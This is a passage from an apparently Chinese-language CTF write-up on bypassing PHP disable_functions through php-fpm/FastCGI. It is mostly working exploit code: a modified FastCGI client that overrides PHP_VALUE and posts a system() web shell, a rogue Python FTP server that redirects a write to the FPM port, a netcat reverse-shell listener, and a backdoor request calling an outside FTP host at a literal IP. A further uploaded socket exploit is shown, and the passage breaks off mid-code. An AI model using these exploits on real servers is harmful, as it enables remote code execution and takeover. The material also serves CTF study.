<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Note : Code is released under the GNU LGPL</span><br><span class="line"> *</span><br><span class="line"> * Please do not change the header of this file</span><br><span class="line"> *</span><br><span class="line"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="line"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="line"> * the License, or (at your option) any later version.</span><br><span class="line"> *</span><br><span class="line"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="line"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"> *</span><br><span class="line"> * See the GNU Lesser General Public License for more details.</span><br><span class="line"> */</span><br><span class="line">/**</span><br><span class="line"> * Handles communication with a FastCGI application</span><br><span class="line"> *</span><br><span class="line"> * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;</span><br><span class="line"> * @version     1.0</span><br><span class="line"> */</span><br><span class="line">class FCGIClient</span><br><span class="line">&#123;</span><br><span class="line">    const VERSION_1            = 1;</span><br><span class="line">    const BEGIN_REQUEST        = 1;</span><br><span class="line">    const ABORT_REQUEST        = 2;</span><br><span class="line">    const END_REQUEST          = 3;</span><br><span class="line">    const PARAMS               = 4;</span><br><span class="line">    const STDIN                = 5;</span><br><span class="line">    const STDOUT               = 6;</span><br><span class="line">    const STDERR               = 7;</span><br><span class="line">    const DATA                 = 8;</span><br><span class="line">    const GET_VALUES           = 9;</span><br><span class="line">    const GET_VALUES_RESULT    = 10;</span><br><span class="line">    const UNKNOWN_TYPE         = 11;</span><br><span class="line">    const MAXTYPE              = self::UNKNOWN_TYPE;</span><br><span class="line">    const RESPONDER            = 1;</span><br><span class="line">    const AUTHORIZER           = 2;</span><br><span class="line">    const FILTER               = 3;</span><br><span class="line">    const REQUEST_COMPLETE     = 0;</span><br><span class="line">    const CANT_MPX_CONN        = 1;</span><br><span class="line">    const OVERLOADED           = 2;</span><br><span class="line">    const UNKNOWN_ROLE         = 3;</span><br><span class="line">    const MAX_CONNS            = &#x27;MAX_CONNS&#x27;;</span><br><span class="line">    const MAX_REQS             = &#x27;MAX_REQS&#x27;;</span><br><span class="line">    const MPXS_CONNS           = &#x27;MPXS_CONNS&#x27;;</span><br><span class="line">    const HEADER_LEN           = 8;</span><br><span class="line">    /**</span><br><span class="line">     * Socket</span><br><span class="line">     * @var Resource</span><br><span class="line">     */</span><br><span class="line">    private $_sock = null;</span><br><span class="line">    /**</span><br><span class="line">     * Host</span><br><span class="line">     * @var String</span><br><span class="line">     */</span><br><span class="line">    private $_host = null;</span><br><span class="line">    /**</span><br><span class="line">     * Port</span><br><span class="line">     * @var Integer</span><br><span class="line">     */</span><br><span class="line">    private $_port = null;</span><br><span class="line">    /**</span><br><span class="line">     * Keep Alive</span><br><span class="line">     * @var Boolean</span><br><span class="line">     */</span><br><span class="line">    private $_keepAlive = false;</span><br><span class="line">    /**</span><br><span class="line">     * Constructor</span><br><span class="line">     *</span><br><span class="line">     * @param String $host Host of the FastCGI application</span><br><span class="line">     * @param Integer $port Port of the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_host = $host;</span><br><span class="line">        $this-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="line">     * alive at the end of a request</span><br><span class="line">     *</span><br><span class="line">     * @param Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function setKeepAlive($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_keepAlive = (boolean)$b;</span><br><span class="line">        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span><br><span class="line">            fclose($this-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get the keep alive status</span><br><span class="line">     *</span><br><span class="line">     * @return Boolean true if the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function getKeepAlive()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Create a connection to the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    private function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        if (!$this-&gt;_sock) &#123;</span><br><span class="line">            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span><br><span class="line">            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);</span><br><span class="line">            if (!$this-&gt;_sock) &#123;</span><br><span class="line">                throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build a FastCGI packet</span><br><span class="line">     *</span><br><span class="line">     * @param Integer $type Type of the packet</span><br><span class="line">     * @param String $content Content of the packet</span><br><span class="line">     * @param Integer $requestId RequestId</span><br><span class="line">     */</span><br><span class="line">    private function buildPacket($type, $content, $requestId = 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        return chr(self::VERSION_1)         /* version */</span><br><span class="line">            . chr($type)                    /* type */</span><br><span class="line">            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */</span><br><span class="line">            . chr($requestId &amp; 0xFF)        /* requestIdB0 */</span><br><span class="line">            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */</span><br><span class="line">            . chr($clen &amp; 0xFF)             /* contentLengthB0 */</span><br><span class="line">            . chr(0)                        /* paddingLength */</span><br><span class="line">            . chr(0)                        /* reserved */</span><br><span class="line">            . $content;                     /* content */</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build an FastCGI Name value pair</span><br><span class="line">     *</span><br><span class="line">     * @param String $name Name</span><br><span class="line">     * @param String $value Value</span><br><span class="line">     * @return String FastCGI Name value pair</span><br><span class="line">     */</span><br><span class="line">    private function buildNvpair($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        if ($nlen &lt; 128) &#123;</span><br><span class="line">            /* nameLengthB0 */</span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($vlen &lt; 128) &#123;</span><br><span class="line">            /* valueLengthB0 */</span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);</span><br><span class="line">        &#125;</span><br><span class="line">        /* nameData &amp; valueData */</span><br><span class="line">        return $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a set of FastCGI Name value pairs</span><br><span class="line">     *</span><br><span class="line">     * @param String $data Data containing the set of FastCGI NVPair</span><br><span class="line">     * @return array of NVPair</span><br><span class="line">     */</span><br><span class="line">    private function readNvpair($data, $length = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $array = array();</span><br><span class="line">        if ($length === null) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = 0;</span><br><span class="line">        while ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            if ($nlen &gt;= 128) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            if ($vlen &gt;= 128) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        return $array;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Decode a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @param String $data String containing all the packet</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    private function decodePacketHeader($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = array();</span><br><span class="line">        $ret[&#x27;version&#x27;]       = ord($data&#123;0&#125;);</span><br><span class="line">        $ret[&#x27;type&#x27;]          = ord($data&#123;1&#125;);</span><br><span class="line">        $ret[&#x27;requestId&#x27;]     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);</span><br><span class="line">        $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);</span><br><span class="line">        $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;);</span><br><span class="line">        $ret[&#x27;reserved&#x27;]      = ord($data&#123;7&#125;);</span><br><span class="line">        return $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    private function readPacket()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = $this-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[&#x27;content&#x27;] = &#x27;&#x27;;</span><br><span class="line">            if ($resp[&#x27;contentLength&#x27;]) &#123;</span><br><span class="line">                $len  = $resp[&#x27;contentLength&#x27;];</span><br><span class="line">                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;</span><br><span class="line">                    $len -= strlen($buf);</span><br><span class="line">                    $resp[&#x27;content&#x27;] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if ($resp[&#x27;paddingLength&#x27;]) &#123;</span><br><span class="line">                $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $resp;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get Informations on the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $requestedInfo information to retrieve</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    public function getValues(array $requestedInfo)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">        $request = &#x27;&#x27;;</span><br><span class="line">        foreach ($requestedInfo as $info) &#123;</span><br><span class="line">            $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));</span><br><span class="line">        $resp = $this-&gt;readPacket();</span><br><span class="line">        if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123;</span><br><span class="line">            return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Execute a request to the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $params Array of parameters</span><br><span class="line">     * @param String $stdin Content</span><br><span class="line">     * @return String</span><br><span class="line">     */</span><br><span class="line">    public function request(array $params, $stdin)</span><br><span class="line">    &#123;</span><br><span class="line">        $response = &#x27;&#x27;;</span><br><span class="line">//        $this-&gt;connect();</span><br><span class="line">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));</span><br><span class="line">        $paramsRequest = &#x27;&#x27;;</span><br><span class="line">        foreach ($params as $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($paramsRequest) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;);</span><br><span class="line">        if ($stdin) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;);</span><br><span class="line">        echo(&#x27;data=&#x27;.urlencode($request));//这边与上面的脚本就不同了，这个直接拼接get参数，进行二次编码输出</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$filepath = &quot;/var/www/html/add_api.php&quot;;    // 目标主机已知的PHP文件的路径</span><br><span class="line">$req = &#x27;/&#x27;.basename($filepath);</span><br><span class="line">$uri = $req .&#x27;?&#x27;.&#x27;command=whoami&#x27;;    // 常规，不用管</span><br><span class="line">$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);    //是基于本地的unix进行绕过df</span><br><span class="line">$code = &quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;;    // POST数据，不用管</span><br><span class="line">$php_value = &quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;;</span><br><span class="line">$params = array(</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;    =&gt; &#x27;POST&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;   =&gt; $filepath,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;       =&gt; $req,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;      =&gt; &#x27;command=whoami&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;       =&gt; $uri,</span><br><span class="line">    &#x27;DOCUMENT_URI&#x27;      =&gt; $req,</span><br><span class="line">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span><br><span class="line">    &#x27;PHP_VALUE&#x27;         =&gt; $php_value,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;   =&gt; &#x27;80sec/wofeiwo&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;       =&gt; &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;       =&gt; &#x27;9001&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;       =&gt; &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;       =&gt; &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;       =&gt; &#x27;localhost&#x27;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;   =&gt; &#x27;HTTP/1.1&#x27;,</span><br><span class="line">    &#x27;CONTENT_LENGTH&#x27;    =&gt; strlen($code)</span><br><span class="line">);</span><br><span class="line">echo $client-&gt;request($params, $code).&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="利用FTP反弹"><a href="#利用FTP反弹" class="headerlink" title="利用FTP反弹"></a>利用FTP反弹</h4><p>接着就是常规的FTP协议了，在VPS上搭建FTP服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;, 23))</span><br><span class="line">s.listen(1)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(b&#x27;220 welcome\n&#x27;)</span><br><span class="line">#Service ready for new user.</span><br><span class="line">#Client send anonymous username</span><br><span class="line">#USER anonymous</span><br><span class="line">conn.send(b&#x27;331 Please specify the password.\n&#x27;)</span><br><span class="line">#User name okay, need password.</span><br><span class="line">#Client send anonymous password.</span><br><span class="line">#PASS anonymous</span><br><span class="line">conn.send(b&#x27;230 Login successful.\n&#x27;)</span><br><span class="line">#User logged in, proceed. Logged out if appropriate.</span><br><span class="line">#TYPE I</span><br><span class="line">conn.send(b&#x27;200 Switching to Binary mode.\n&#x27;)</span><br><span class="line">#Size /</span><br><span class="line">conn.send(b&#x27;550 Could not get the file size.\n&#x27;)</span><br><span class="line">#EPSV (1)</span><br><span class="line">conn.send(b&#x27;150 ok\n&#x27;)</span><br><span class="line">#PASV</span><br><span class="line">conn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;) #STOR / (2)</span><br><span class="line">conn.send(b&#x27;150 Permission denied.\n&#x27;)</span><br><span class="line">#QUIT</span><br><span class="line">conn.send(b&#x27;221 Goodbye.\n&#x27;)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p>然后在 vps 上开启一个 nc 监听，用于接收反弹的shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>

<p>最后通过 eval() 构造如下恶意代码通过 file_put_contents() 与我们 vps 上恶意的 ftp 服务器建立连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">/add_api.php?backdoor=$file = $_GET[&#x27;file&#x27;];$data = $_GET[&#x27;data&#x27;];file_put_contents($file,$data);&amp;file=ftp://47.101.57.72:23/123&amp;data=Exp_Payload</span><br></pre></td></tr></table></figure>

<p>PS：不用这样的方式的话可以先构造一个SSRF页面，然后传参进去，其实是一样的。</p>
<p>至此我们就拿到反弹Shell了，接下来提权就可以了。</p>
<p>PHP内核分析：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/530158105_121124363?qq-pf-to=pcqq.c2c">https://www.sohu.com/a/530158105_121124363?qq-pf-to=pcqq.c2c</a></p>
<h1 id="CTF-Echohub"><a href="#CTF-Echohub" class="headerlink" title="*CTF Echohub"></a>*CTF Echohub</h1><p>当我们连上面的 file_put_contents() 函数都不能使用时用下面的方法。</p>
<p>假设场景，能够上传php文件或者执行代码，将下面的EXP上传到服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php</span><br><span class="line">	$sock=stream_socket_client(&#x27;unix:///tmp/php-cgi-74.sock&#x27;);</span><br><span class="line">    fwrite($sock, base64_decode($_GET[&#x27;cmd&#x27;]));</span><br><span class="line">	var_dump(fread($sock, 4096));</span><br></pre></td></tr></table></figure>

<p>将p神的EXP修改一下，只输出生成的payload的base64数据。<code>__connect()</code>写成恒返回真，将payload进行base64编码后输出，并结束程序执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 